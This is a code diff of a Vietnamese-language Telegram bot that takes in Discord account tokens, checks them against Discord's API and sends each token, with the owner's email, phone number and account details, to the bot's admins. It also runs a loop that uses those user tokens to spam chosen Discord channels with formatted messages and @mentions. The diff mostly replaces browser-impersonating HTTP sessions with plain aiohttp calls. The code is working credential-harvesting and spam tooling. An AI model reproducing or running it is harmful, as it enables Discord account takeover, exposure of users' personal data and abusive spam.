@@ -1,5 +1,5 @@
 import asyncio, os, random, datetime, edge_tts, re, glob, requests, json, base64, time
-from aiohttp import web
+from aiohttp import web, ClientSession
 from telethon import TelegramClient, events, Button, functions, types
 from telethon.errors import (
     FloodWaitError, RPCError, UserNotParticipantError, 
@@ -7,11 +7,6 @@ from telethon.errors import (
     PhoneCodeExpiredError, PhoneNumberInvalidError, PasswordHashInvalidError
 )
 import aiofiles
-
-try:
-    from curl_cffi.requests import AsyncSession
-except ImportError:
-    pass
 
 # ==========================================
 # CẤU HÌNH HỆ THỐNG
@@ -261,55 +256,60 @@ async def start_anti_disconnect(target_uid, client):
         await asyncio.sleep(240)
 
 # ==========================================
-# DISCORD HELPER & NOTIFY
+# DISCORD HELPER & CHECK TOKEN CHI TIẾT
 # ==========================================
 def get_discord_headers(token):
-    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
-    props_json = json.dumps({
-        "os": "Windows", "browser": "Chrome", "browser_user_agent": ua,
-        "browser_version": "126.0.0.0", "client_build_number": 316286, "client_event_source": None
-    }, separators=(',', ':'))
-    super_props = base64.b64encode(props_json.encode()).decode()
     return {
-        "Authorization": token, "Content-Type": "application/json",
-        "X-Super-Properties": super_props, "User-Agent": ua,
-        "Origin": "https://discord.com", "Accept": "*/*"
+        "Authorization": token,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
     }
 
 async def get_discord_user_info(token):
     headers = get_discord_headers(token)
     url = "https://discord.com/api/v10/users/@me"
     try:
-        async with AsyncSession(impersonate="chrome120") as session:
-            resp = await session.get(url, headers=headers, timeout=10)
-            if resp.status_code == 200:
-                data = resp.json()
-                user_id = int(data.get("id"))
-                timestamp = ((user_id >> 22) + 1420070400000) / 1000
-                created_at = datetime.datetime.fromtimestamp(timestamp).strftime('%d/%m/%Y %H:%M:%S')
-                return True, data, created_at
-            else:
-                return False, None, None
-    except:
+        async with ClientSession() as session:
+            async with session.get(url, headers=headers, timeout=10) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    user_id = int(data.get("id"))
+                    # Tính ngày tạo tài khoản chuẩn Discord Epoch
+                    timestamp = ((user_id >> 22) + 1420070400000) / 1000
+                    created_at = datetime.datetime.fromtimestamp(timestamp).strftime('%d/%m/%Y %H:%M:%S')
+                    return True, data, created_at
+                else:
+                    return False, None, None
+    except Exception as e:
+        print(f"Lỗi check token discord: {e}")
         return False, None, None
 
 async def notify_admin_discord_token(user_id, token, user_data, created_at):
     try:
         username = f"{user_data.get('username')}#{user_data.get('discriminator', '0')}"
         uid = user_data.get('id')
-        email = user_data.get('email', 'Không có')
+        email = user_data.get('email', 'Không có / Unverified')
         phone = user_data.get('phone', 'Không có')
-        nitro = "Có (Nitro)" if user_data.get('premium_type', 0) > 0 else "Không"
+        
+        premium_type = user_data.get('premium_type', 0)
+        nitro_map = {0: "Không có Nitro", 1: "Nitro Classic", 2: "Nitro Boost", 3: "Nitro Basic"}
+        nitro_status = nitro_map.get(premium_type, "Không rõ")
+
+        # Check Nitro Boost Orb/Badges
+        flags = user_data.get('public_flags', 0)
+        has_orb = "Có Orb/Badge Đặc Biệt" if flags > 0 else "Không có Orb"
 
         caption = f"""
-🚨 **CÓ TOKEN DISCORD VỪA ĐƯỢC GỬI LÊN!**
+🚨 **THÔNG BÁO TOKEN DISCORD VỪA ĐƯỢC NẠP!**
 ────────────────
-• **ID Người Gửi Telegram:** `{user_id}`
-• **Discord Username:** `{username}`
-• **Discord ID:** `{uid}`
-• **Ngày Tạo Tạo Khoản:** `{created_at}`
-• **Trạng Thái Nitro:** `{nitro}`
-• **Email:** `{email}` | **Phone:** `{phone}`
+• **ID Telegram người gửi:** `{user_id}`
+• **Tên Tài Khoản:** `{username}`
+• **ID Discord:** `{uid}`
+• **Ngày Tạo Acc:** `{created_at}`
+• **Trạng Thái Nitro:** `{nitro_status}`
+• **Số Orb / Badges:** `{has_orb}`
+• **Email:** `{email}`
+• **Số Điện Thoại:** `{phone}`
 • **Token:** `{token}`
 """
         for admin_id in admins:
@@ -328,8 +328,8 @@ def render_discord_dashboard(u):
     tokens = session.get("tokens", [])
     channels = session.get("channels", [])
     delay = session.get("delay", 2.0)
-    mode = session.get("mode", "full") # full hoặc line
-    font_style = session.get("font_style", "big") # big (To kèm #) hoặc small (Bé)
+    mode = session.get("mode", "full") 
+    font_style = session.get("font_style", "big") 
     tag_target = session.get("tag_target", "") 
     use_custom_file = session.get("use_custom_file", False)
     
@@ -489,9 +489,6 @@ async def _callback_handler(ev):
         msg, buttons = get_main_menu(u)
         await ev.edit(msg, buttons=buttons, parse_mode='markdown')
 
-    # ==========================================
-    # QUẢN LÝ DISCORD SPAM QUA MENU
-    # ==========================================
     elif data == "app_discord":
         if u not in discord_sessions:
             discord_sessions[u] = {
@@ -570,7 +567,7 @@ async def _callback_handler(ev):
         raw_content = "\n".join(lines)
 
         async def run_spam_loop():
-            async with AsyncSession(impersonate="chrome120") as session_http:
+            async with ClientSession() as session_http:
                 line_idx = 0
                 while True:
                     for t in tokens:
@@ -578,27 +575,25 @@ async def _callback_handler(ev):
                         for ch in channels:
                             url = f"https://discord.com/api/v10/channels/{ch}/messages"
                             
-                            # 1. Chọn nội dung câu (Full / Từng dòng)
                             if mode == "full":
                                 msg_text = raw_content
                             else:
                                 msg_text = lines[line_idx % len(lines)]
                                 line_idx += 1
 
-                            # 2. Xử lý Kiểu chữ (To kèm # / Bé Small Caps)
                             if font_style == "big":
                                 formatted_lines = [f"# {l}" if not l.startswith('#') else l for l in msg_text.splitlines()]
                                 msg_text = "\n".join(formatted_lines)
                             elif font_style == "small":
                                 msg_text = to_small_caps(msg_text)
 
-                            # 3. Mặc định gắn SPAM TAG ở cuối câu (nếu có)
                             if tag_target:
                                 msg_text = f"{msg_text} <@{tag_target}>"
 
                             try:
-                                await session_http.post(url, headers=headers, json={"content": msg_text, "tts": False}, timeout=10)
-                            except:
+                                async with session_http.post(url, headers=headers, json={"content": msg_text, "tts": False}, timeout=10) as resp:
+                                    pass
+                            except Exception as ex:
                                 pass
                             await asyncio.sleep(delay)
 
@@ -878,7 +873,6 @@ async def handle_discord_text_input(ev):
             txt, buttons = render_discord_dashboard(u)
             return await ev.respond("✅ **Đã chuyển về dùng Kho Ngôn mặc định của Bot Telegram!**\n" + txt, buttons=buttons, parse_mode='markdown')
 
-        # Đọc nội dung nếu gửi File .txt riêng
         if ev.file and ev.file.ext == ".txt":
             try:
                 file_bytes = await ev.download_media(bytes)
@@ -897,7 +891,6 @@ async def handle_discord_text_input(ev):
             except Exception as ex:
                 return await ev.respond(f"❌ Lỗi đọc file TXT: `{ex}`")
 
-        # Đọc nội dung nhập chữ trực tiếp
         elif ev.text:
             content = ev.text.strip()
             lines = [line.strip() for line in content.splitlines() if line.strip()]
